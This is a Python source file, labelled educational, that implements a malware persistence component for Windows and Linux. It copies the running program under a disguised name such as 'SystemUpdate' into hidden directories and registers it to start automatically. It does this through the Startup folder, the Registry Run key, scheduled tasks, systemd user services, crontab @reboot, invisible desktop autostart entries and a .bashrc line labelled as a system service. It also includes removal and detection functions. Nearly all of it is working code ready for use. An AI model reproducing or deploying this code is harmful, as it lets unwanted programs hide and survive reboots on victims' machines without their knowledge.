"""
Persistence Module - Auto-start on system boot
Educational implementation of malware persistence techniques
"""

import os
import sys
import platform
import shutil
from pathlib import Path


class PersistenceManager:
    """
    Manages persistence across Windows and Linux platforms
    Educational purpose: Demonstrates how malware achieves persistence
    """

    def __init__(self, program_name="SystemUpdate", hide_location=True):
        """
        Initialize persistence manager

        Args:
            program_name (str): Name to disguise the program
            hide_location (bool): Whether to hide in system directories
        """
        self.program_name = program_name
        self.hide_location = hide_location
        self.system = platform.system()
        self.current_file = os.path.abspath(sys.argv[0])

    def install(self):
        """
        Install persistence based on OS
        Returns: (success, method_used, install_path)
        """
        try:
            if self.system == "Windows":
                return self._install_windows()
            elif self.system == "Linux":
                return self._install_linux()
            else:
                return False, "Unsupported OS", None
        except Exception as e:
            return False, f"Error: {str(e)}", None

    def _install_windows(self):
        """Install persistence on Windows"""
        methods_tried = []

        # Method 1: Startup Folder (User-level, no admin required)
        try:
            startup_folder = Path(os.path.expandvars(
                r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'
            ))

            if startup_folder.exists():
                if self.hide_location:
                    # Hide in AppData
                    hidden_dir = Path(os.path.expandvars(r'%APPDATA%\SystemData'))
                    hidden_dir.mkdir(exist_ok=True)
                    target_path = hidden_dir / f"{self.program_name}.exe"

                    # Copy executable
                    shutil.copy2(self.current_file, target_path)

                    # Create shortcut in startup folder
                    shortcut_path = startup_folder / f"{self.program_name}.lnk"
                    self._create_windows_shortcut(target_path, shortcut_path)

                    # Hide directory
                    os.system(f'attrib +h "{hidden_dir}"')

                    return True, "Startup Folder + Hidden AppData", str(target_path)
                else:
                    target_path = startup_folder / f"{self.program_name}.exe"
                    shutil.copy2(self.current_file, target_path)
                    return True, "Startup Folder", str(target_path)

            methods_tried.append("Startup Folder - Not found")
        except Exception as e:
            methods_tried.append(f"Startup Folder - Error: {e}")

        # Method 2: Registry Run Key (requires write access)
        try:
            import winreg

            if self.hide_location:
                hidden_dir = Path(os.path.expandvars(r'%APPDATA%\SystemData'))
                hidden_dir.mkdir(exist_ok=True)
                target_path = hidden_dir / f"{self.program_name}.exe"
                shutil.copy2(self.current_file, target_path)
                os.system(f'attrib +h "{hidden_dir}"')
            else:
                target_path = self.current_file

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE
            )

            winreg.SetValueEx(key, self.program_name, 0, winreg.REG_SZ, str(target_path))
            winreg.CloseKey(key)

            return True, "Registry Run Key", str(target_path)

        except Exception as e:
            methods_tried.append(f"Registry - Error: {e}")

        # Method 3: Scheduled Task (if others fail)
        try:
            if self.hide_location:
                hidden_dir = Path(os.path.expandvars(r'%APPDATA%\SystemData'))
                hidden_dir.mkdir(exist_ok=True)
                target_path = hidden_dir / f"{self.program_name}.exe"
                shutil.copy2(self.current_file, target_path)
            else:
                target_path = self.current_file

            cmd = f'schtasks /create /tn "{self.program_name}" /tr "{target_path}" /sc onlogon /f'
            result = os.system(cmd)

            if result == 0:
                return True, "Scheduled Task", str(target_path)
            else:
                methods_tried.append("Scheduled Task - Failed")

        except Exception as e:
            methods_tried.append(f"Scheduled Task - Error: {e}")

        return False, f"All methods failed: {', '.join(methods_tried)}", None

    def _install_linux(self):
        """Install persistence on Linux"""
        methods_tried = []
        home = Path.home()

        # Method 1: Systemd User Service (modern Linux)
        try:
            systemd_dir = home / ".config" / "systemd" / "user"
            systemd_dir.mkdir(parents=True, exist_ok=True)

            if self.hide_location:
                # Hide in .config
                hidden_dir = home / ".config" / ".system"
                hidden_dir.mkdir(exist_ok=True)
                target_path = hidden_dir / self.program_name
                shutil.copy2(self.current_file, target_path)
                os.chmod(target_path, 0o755)
            else:
                target_path = Path(self.current_file)

            service_content = f"""[Unit]
Description={self.program_name} Service
After=network.target

[Service]
Type=simple
ExecStart={target_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""

            service_file = systemd_dir / f"{self.program_name}.service"
            service_file.write_text(service_content)

            # Enable the service
            os.system(f"systemctl --user enable {self.program_name}.service 2>/dev/null")
            os.system(f"systemctl --user start {self.program_name}.service 2>/dev/null")

            return True, "Systemd User Service", str(target_path)

        except Exception as e:
            methods_tried.append(f"Systemd - Error: {e}")

        # Method 2: Crontab @reboot
        try:
            if self.hide_location:
                hidden_dir = home / ".local" / ".system"
                hidden_dir.mkdir(parents=True, exist_ok=True)
                target_path = hidden_dir / self.program_name
                shutil.copy2(self.current_file, target_path)
                os.chmod(target_path, 0o755)
            else:
                target_path = Path(self.current_file)

            # Add to crontab
            cron_entry = f"@reboot {target_path} &\n"

            # Read existing crontab
            result = os.popen("crontab -l 2>/dev/null").read()

            # Check if entry already exists
            if str(target_path) not in result:
                # Add new entry
                new_crontab = result + cron_entry
                os.system(f'echo "{new_crontab}" | crontab -')

                return True, "Crontab @reboot", str(target_path)

        except Exception as e:
            methods_tried.append(f"Crontab - Error: {e}")

        # Method 3: Desktop Autostart (for GUI environments)
        try:
            autostart_dir = home / ".config" / "autostart"
            autostart_dir.mkdir(parents=True, exist_ok=True)

            if self.hide_location:
                hidden_dir = home / ".config" / ".system"
                hidden_dir.mkdir(exist_ok=True)
                target_path = hidden_dir / self.program_name
                shutil.copy2(self.current_file, target_path)
                os.chmod(target_path, 0o755)
            else:
                target_path = Path(self.current_file)

            desktop_content = f"""[Desktop Entry]
Type=Application
Name={self.program_name}
Exec={target_path}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""

            desktop_file = autostart_dir / f"{self.program_name}.desktop"
            desktop_file.write_text(desktop_content)
            os.chmod(desktop_file, 0o644)

            return True, "Desktop Autostart", str(target_path)

        except Exception as e:
            methods_tried.append(f"Desktop Autostart - Error: {e}")

        # Method 4: .bashrc / .profile (fallback)
        try:
            if self.hide_location:
                hidden_dir = home / ".local" / ".system"
                hidden_dir.mkdir(parents=True, exist_ok=True)
                target_path = hidden_dir / self.program_name
                shutil.copy2(self.current_file, target_path)
                os.chmod(target_path, 0o755)
            else:
                target_path = Path(self.current_file)

            bashrc = home / ".bashrc"
            entry = f"\n# System service\n{target_path} & 2>/dev/null\n"

            if bashrc.exists():
                content = bashrc.read_text()
                if str(target_path) not in content:
                    with open(bashrc, 'a') as f:
                        f.write(entry)
                    return True, ".bashrc", str(target_path)

        except Exception as e:
            methods_tried.append(f".bashrc - Error: {e}")

        return False, f"All methods failed: {', '.join(methods_tried)}", None

    def _create_windows_shortcut(self, target, shortcut_path):
        """Create a Windows shortcut (.lnk file)"""
        try:
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(str(shortcut_path))
            shortcut.Targetpath = str(target)
            shortcut.WorkingDirectory = str(Path(target).parent)
            shortcut.save()
        except ImportError:
            # Fallback: create batch file
            batch_path = shortcut_path.with_suffix('.bat')
            batch_path.write_text(f'@echo off\nstart "" "{target}"')

    def uninstall(self):
        """Remove persistence (for cleanup)"""
        try:
            if self.system == "Windows":
                return self._uninstall_windows()
            elif self.system == "Linux":
                return self._uninstall_linux()
        except Exception as e:
            return False, f"Error: {str(e)}"

    def _uninstall_windows(self):
        """Remove Windows persistence"""
        removed = []

        # Remove from startup folder
        try:
            startup_folder = Path(os.path.expandvars(
                r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'
            ))
            for file in startup_folder.glob(f"{self.program_name}.*"):
                file.unlink()
                removed.append(f"Startup: {file.name}")
        except:
            pass

        # Remove from registry
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, self.program_name)
            winreg.CloseKey(key)
            removed.append("Registry Run Key")
        except:
            pass

        # Remove scheduled task
        try:
            os.system(f'schtasks /delete /tn "{self.program_name}" /f')
            removed.append("Scheduled Task")
        except:
            pass

        return True, f"Removed: {', '.join(removed)}" if removed else "Nothing to remove"

    def _uninstall_linux(self):
        """Remove Linux persistence"""
        removed = []
        home = Path.home()

        # Remove systemd service
        try:
            os.system(f"systemctl --user stop {self.program_name}.service 2>/dev/null")
            os.system(f"systemctl --user disable {self.program_name}.service 2>/dev/null")
            service_file = home / ".config" / "systemd" / "user" / f"{self.program_name}.service"
            if service_file.exists():
                service_file.unlink()
                removed.append("Systemd service")
        except:
            pass

        # Remove from crontab
        try:
            result = os.popen("crontab -l 2>/dev/null").read()
            lines = [line for line in result.split('\n') if self.program_name not in line]
            os.system(f'echo "{chr(10).join(lines)}" | crontab -')
            removed.append("Crontab")
        except:
            pass

        # Remove desktop autostart
        try:
            desktop_file = home / ".config" / "autostart" / f"{self.program_name}.desktop"
            if desktop_file.exists():
                desktop_file.unlink()
                removed.append("Desktop autostart")
        except:
            pass

        return True, f"Removed: {', '.join(removed)}" if removed else "Nothing to remove"

    def check_installed(self):
        """Check if persistence is already installed"""
        if self.system == "Windows":
            return self._check_windows()
        elif self.system == "Linux":
            return self._check_linux()
        return False, "Unknown OS"

    def _check_windows(self):
        """Check Windows persistence"""
        locations = []

        # Check startup folder
        startup_folder = Path(os.path.expandvars(
            r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'
        ))
        if any(startup_folder.glob(f"{self.program_name}.*")):
            locations.append("Startup Folder")

        # Check registry
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_READ
            )
            try:
                winreg.QueryValueEx(key, self.program_name)
                locations.append("Registry Run Key")
            except:
                pass
            winreg.CloseKey(key)
        except:
            pass

        return len(locations) > 0, locations

    def _check_linux(self):
        """Check Linux persistence"""
        locations = []
        home = Path.home()

        # Check systemd
        service_file = home / ".config" / "systemd" / "user" / f"{self.program_name}.service"
        if service_file.exists():
            locations.append("Systemd service")

        # Check crontab
        result = os.popen("crontab -l 2>/dev/null").read()
        if self.program_name in result:
            locations.append("Crontab")

        # Check autostart
        desktop_file = home / ".config" / "autostart" / f"{self.program_name}.desktop"
        if desktop_file.exists():
            locations.append("Desktop autostart")

        return len(locations) > 0, locations
